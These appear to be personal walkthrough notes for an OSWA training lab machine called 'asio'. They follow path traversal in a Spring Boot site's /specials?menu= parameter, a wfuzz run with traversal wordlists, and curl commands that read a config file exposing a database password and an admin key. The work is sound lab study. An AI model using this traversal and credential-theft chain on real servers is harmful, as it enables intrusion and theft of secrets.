
#### Starting Page
![[Pasted image 20250102164329.png]]
going to begin clicking on `Intro, Menu, Specials, Newsletter, Contact`

#### Menu
looks like a potential `database` - maybe `SQL`
![[Pasted image 20250102164442.png]]

#### Specials
potential `SQL`
![[Pasted image 20250102164526.png]]
#### Newsletter
- looks like a place to test, inserted `test@test.local` to see a `POST` request
![[Pasted image 20250102164620.png]]
what the `BURP` looks like
![[Pasted image 20250102164713.png]]

#### Contact
looks like a potential vector as well - lets test the fields a bit
![[Pasted image 20250102164747.png]]
what it looks like in `BURP`
![[Pasted image 20250102164854.png]]
looks like the same return message as the `newsletter`


#### /login
- a way to authenticate maybe way to use later
![[Pasted image 20250102165015.png]]

#### /error
get this error when browsing to `/error`, googling states that it is a `SpringBoot` Error
![[Pasted image 20250102165357.png]]
makes sense that this is running java - could be relevant later
![[Pasted image 20250102165448.png]]

#### /specials
when browsing to `/specials` we get the same error
![[Pasted image 20250102165644.png]]
but when we look in `burpsuite` we are able to see `winter.html` being referenced - possibly for the menu, lets try seeing other files
![[Pasted image 20250102165738.png]]
testing for `LFI` we come up with looking for the `/etc/passwd` equivalent which is the `window/win.ini` file by utilizing this request
```http
GET /specials?menu=../../../../../../../../../../windows/win.ini HTTP/1.1
```
the burp request shows that we have command execution
![[Pasted image 20250102173514.png]]
now because we know that it is a `SPRING BOOT` server lets do research to file potential file paths

got a potential `/config` path
![[Pasted image 20250102173626.png]]
with ome file names
![[Pasted image 20250102173703.png]]
testing
```http
../../../../../../../../../../config/application.properties
../../../../../../../../../../config/application.yml
```
because we dont know how far back from the working directory that the `config` file is we're going to have to `FUZZ` do to them not being found
![[Pasted image 20250102174111.png]]

##### Fuzzing
going to make `paths.txt` and `files.txt`

`paths.txt`
```bash
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../../
../../../../../../../../../../
../../../../../../../../../../../
```

`files.txt`
- found config files by googling `Spring Boot server config`
```bash
application.properties
application.yml
config/application.properties
config/application.yml
```

`wfuzz`
- found the path with `../`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[02Jan2025 22:45:05]-[/home/â€¦/SUT/OSWA/challenge_labs/asio]
â””â”€# wfuzz -w paths.txt -w files.txt --hh 0 http://asio/specials?menu=FUZZFUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://asio/specials?menu=FUZZFUZ2Z
Total requests: 40

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000000003:   200        18 L     21 W       523 Ch      "../ - config/application.properties"                                                                                                      

Total time: 0
Processed Requests: 40
Filtered Requests: 39
Requests/sec.: 0
```
now browsing to the reques tin `BURP` we are able to grab the `admin.portal.key` - 06c82a1f-892d-48de-8682-67c0c3a096b4
![[Pasted image 20250102174819.png]]
we can also do the same thing using `curl`

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[02Jan2025 22:45:27]-[/home/â€¦/SUT/OSWA/challenge_labs/asio]
â””â”€# curl http://asio/specials?menu=../config/application.properties
# STRIGI'S PIZZA 
server.port=80
server.address=0.0.0.0
spring.web.resources.cache.cachecontrol.max-age=1d
# LOGGING
logging.file.name=logs/strigi.log
logging.level.root=WARN

# DATABASE
spring.datasource.driver-class-name=com.microsoft.sqlserver.jdbc.SQLServerDriver
spring.datasource.url=jdbc:sqlserver://127.0.0.1;databaseName=strigi

spring.datasource.username=sa
spring.datasource.password=MqFuFWUGNrR3P4bJ

spring.datasource.hikari.max-lifetime=30

# ADMIN PORTAL
admin.portal.key=06c82a1f-892d-48de-8682-67c0c3a096b4        
```
now browse to `/login` and attempt to login
![[Pasted image 20250102174957.png]]
profit
![[Pasted image 20250102175018.png]]